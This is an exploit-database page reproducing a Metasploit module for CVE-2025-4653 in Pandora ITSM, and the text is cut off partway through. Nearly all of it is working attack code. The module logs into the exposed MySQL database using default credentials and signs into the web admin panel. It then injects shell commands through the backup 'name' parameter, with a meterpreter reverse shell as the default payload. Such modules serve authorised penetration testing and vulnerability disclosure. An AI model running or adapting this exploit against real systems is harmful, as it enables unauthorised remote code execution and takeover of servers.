---
title: Pandora ITSM Authenticated Command Injection
url: https://cxsecurity.com/issue/WLB-2025080007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-11
fetch_date: 2025-10-07T00:12:41.668016
---

# Pandora ITSM Authenticated Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Pandora ITSM Authenticated Command Injection** **2025.08.10**  Credit:  **[h00die-gr3y](https://cxsecurity.com/author/h00die-gr3y/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/proto/mysql/client'
require 'digest/md5'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include BCrypt
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
# @!attribute [rw] mysql\_client
# @return [::Rex::Proto::MySQL::Client]
attr\_accessor :mysql\_client
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Pandora ITSM authenticated command injection leading to RCE via the backup function',
'Description' => %q{
Pandora ITSM is a platform for Service Management & Support including a Helpdesk for support
and customer service teams, aligned with ITIL processes.
This module exploits a command injection vulnerability in the `name` backup setting at the
application setup page of Pandora ITSM. This can be triggered by generating a backup with a
malicious payload injected at the `name` parameter.
You need to have admin access at the Pandora ITSM Web application in order to execute this RCE.
This access can be achieved by knowing the admin credentials to access the web application or
leveraging a default password vulnerability in Pandora ITSM that allows an attacker to access
the Pandora FMS ITSM database, create a new admin user and gain administrative access to the
Pandora ITSM Web application. This attack can be remotely executed over the WAN as long as the
MySQL services are exposed to the outside world.
This issue affects all ITSM Enterprise editions up to `5.0.105` and is patched at `5.0.106`.
},
'Author' => [
'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Discovery, Metasploit module & default password weakness
],
'References' => [
['CVE', '2025-4653'],
['URL', 'https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/'],
['URL', 'https://github.com/h00die-gr3y/h00die-gr3y/security/advisories/GHSA-m4f8-9c8x-8f3f'],
['URL', 'https://attackerkb.com/topics/wgCb1QQm1t/cve-2025-4653']
],
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'linux'],
'Privileged' => false,
'Arch' => [ARCH\_CMD],
'Targets' => [
[
'Unix/Linux Command',
{
'Platform' => ['unix', 'linux'],
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse\_tcp'
},
'Payload' => {
'Encoder' => 'cmd/base64',
'BadChars' => "\x20\x3E\x26\x27\x22" # no space > & ' "
}
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2025-06-10',
'DefaultOptions' => {
'SSL' => true,
'RPORT' => 443
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'Path to the Pandora ITSM application', '/pandoraitsm']),
OptString.new('DB\_USER', [true, 'Pandora database admin user', 'pandoraitsm']),
OptString.new('DB\_PASSWORD', [true, 'Pandora database admin password', 'P4ndor4.itsm']),
OptString.new('DB\_NAME', [true, 'Pandora database', 'pandoraitsm']),
OptPort.new('DB\_PORT', [true, 'MySQL database port', 3306]),
OptString.new('USERNAME', [false, 'Pandora web admin user', 'admin']),
OptString.new('PASSWORD', [false, 'Pandora web admin password', 'integria'])
])
end
# MySQL login
# @param [String] host
# @param [String] user
# @param [String] password
# @param [String] db
# @param [String] port
# @return [TrueClass|FalseClass] true if login successful, else false
def mysql\_login(host, user, password, db, port)
begin
self.mysql\_client = ::Rex::Proto::MySQL::Client.connect(host, user, password, db, port)
rescue Errno::ECONNREFUSED
print\_error('MySQL connection refused')
return false
rescue ::Rex::Proto::MySQL::Client::ClientError
print\_error('MySQL connection timedout')
return false
rescue Errno::ETIMEDOUT
print\_error('Operation timedout')
return false
rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
print\_error('Unable to login from this host due to policy')
return false
rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
print\_error('MySQL Access denied')
return false
rescue StandardError => e
print\_error("Unknown error: #{e.message}")
return false
end
true
end
# MySQL query
# @param [String] sql
# @return [query|nil|FalseClass] if sql query successful (can be nil), else false
def mysql\_query(sql)
begin
res = mysql\_client.query(sql)
rescue ::Rex::Proto::MySQL::Client::Error => e
print\_error("MySQL Error: #{e.class} #{e}")
return false
rescue Rex::ConnectionTimeout => e
print\_error("Timeout: #{e.message}")
return false
rescue StandardError => e
print\_error("Unknown error: #{e.message}")
return false
end
res
end
# login at the Pandora ITSM web application
# @param [String] name
# @param [String] pwd
# @return [TrueClass|FalseClass] true if login successful, else false
def pandoraitsm\_login(name, pwd)
res = send\_request\_cgi!({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'index.php'),
'keep\_cookies' => true,
'vars\_post' => {
'login' => 1,
'nick' => name,
'pass' => pwd,
'Login' => 'LOG IN'
}
})
return false unless res&.code == 200
res.body.include?('godmode')
end
# CVE-2025-4653: Command Injection leading to RCE via the backup "name" parameter triggered by the backup function
def execute\_payload(cmd)
@rce\_payload = ";#{cmd};#"
vprint\_status("RCE payload: #{@rce\_payload}")
@clean\_payload = true
send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'index.php'),
'keep\_cookies' => true,
'vars\_get' => {
'sec' => 'godmode',
'sec2' => 'enterprise/godmode/setup/backup\_manager'
},
'vars\_post' => {
'name' => @rce\_payload.to\_s,
'mode' => 1,
'mail' => nil,
'create\_backup' => 1,
'create' => 'Do a backup now'
}
})
end
# clean-up the payload entries in the backup list by removing the backup name from the list
# it also handles multiple entries (lef...